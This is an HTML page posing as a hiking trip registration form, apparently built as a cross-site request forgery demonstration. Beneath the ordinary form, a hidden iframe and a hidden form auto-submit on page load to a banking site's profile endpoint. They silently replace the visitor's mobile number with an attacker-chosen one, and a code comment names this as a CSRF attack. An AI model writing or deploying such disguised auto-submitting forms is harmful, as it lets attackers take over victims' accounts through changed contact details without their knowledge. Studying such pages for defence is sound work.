<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Hiking Trip Registration</title>
    <link rel="stylesheet" href="style.css" />
    <link rel="icon" type="image/svg+xml" href="/assets/logo.svg" />
  </head>
  <body
    class="bg-gray-200"
    onload="document.getElementById('csrf-form').submit()"
  >
    <main class="max-w-screen-lg px-10 mx-auto my-10">
      <div class="overflow-hidden bg-white rounded-lg">
        <!-- div with background image -->
        <div
          class="w-full h-36 sm:h-44 md:h-64 bg-center bg-cover bg-[url('/assets/hiking.jpg')]"
        ></div>

        <div class="px-8 py-6">
          <header>
            <h1 class="mb-3 text-3xl font-bold">Hiking Trip Registration</h1>
            <p class="text-gray-700">
              Join us for an unforgettable adventure in nature. Fill out the
              form below to secure your spot!
            </p>
          </header>

          <form
            class="grid grid-cols-2 gap-4 my-10"
            action="/submit"
            method="POST"
          >
            <div class="col-span-2 sm:col-span-1">
              <label class="text-sm font-medium" for="name">Full Name</label>
              <input
                type="text"
                id="name"
                name="name"
                class="w-full px-3 py-2 mt-1 border border-gray-300 rounded outline-none"
                required
              />
            </div>

            <div class="col-span-2 sm:col-span-1">
              <label class="text-sm font-medium" for="email">Email</label>
              <input
                type="email"
                id="email"
                name="email"
                class="w-full px-3 py-2 mt-1 border border-gray-300 rounded outline-none"
                required
              />
            </div>

            <div class="col-span-2 sm:col-span-1">
              <label class="text-sm font-medium" for="phone"
                >Phone Number</label
              >
              <input
                type="tel"
                id="phone"
                name="phone"
                class="w-full px-3 py-2 mt-1 border border-gray-300 rounded outline-none"
                required
              />
            </div>

            <div class="col-span-2 sm:col-span-1">
              <label class="text-sm font-medium" for="age">Age</label>
              <input
                type="number"
                min="0"
                max="99"
                id="age"
                name="age"
                class="w-full px-3 py-2 mt-1 border border-gray-300 rounded outline-none"
                required
              />
            </div>

            <div class="col-span-2">
              <label class="text-sm font-medium" for="experience"
                >Hiking Experience</label
              >
              <select
                name="experience"
                id="experience"
                class="w-full px-3 py-2 mt-1 border border-gray-200 rounded outline-none"
              >
                <option value="default" disabled selected>
                  Select your experience level
                </option>
                <option value="beginner">Beginner</option>
                <option value="intermediate">Intermediate</option>
                <option value="advanced">Advanced</option>
                <option value="expert">Expert</option>
              </select>
            </div>

            <div class="col-span-2">
              <label class="text-sm font-medium" for="emergency-name"
                >Emergency Contact Name</label
              >
              <input
                type="text"
                id="emergency-name"
                name="emergency-name"
                class="w-full px-3 py-2 mt-1 border border-gray-300 rounded outline-none"
                required
              />
            </div>

            <div class="col-span-2">
              <label class="text-sm font-medium" for="emergency-phone">
                Emergency Contact Number
              </label>
              <input
                type="tel"
                id="emergency-phone"
                name="emergency-phone"
                class="w-full px-3 py-2 mt-1 border border-gray-300 rounded outline-none"
                required
              />
            </div>

            <div class="col-span-2">
              <label class="text-sm font-medium" for="special-needs">
                Special Needs or Requirements
              </label>
              <textarea
                name="special-needs"
                id="special-needs"
                class="w-full px-3 py-2 mt-1 border border-gray-300 rounded outline-none"
              ></textarea>
            </div>

            <button
              class="w-full col-span-2 py-2 text-white bg-black rounded-md hover:bg-slate-900"
              type="submit"
            >
              Register for the Hike
            </button>
          </form>

          <p class="text-gray-700">
            By submitting this form, you agree to our terms and conditions for
            the hiking trip.
          </p>
        </div>
      </div>
    </main>

    <!-- Hidden form to carry out CSRF attack using an iframe -->
    <iframe name="hiddenFrame" style="display: none"></iframe>
    <form
      id="csrf-form"
      method="POST"
      action="https://bankease.com/profile"
      target="hiddenFrame"
    >
      <input type="hidden" name="mobile" value="+91 99999 99999" />
    </form>
  </body>
</html>
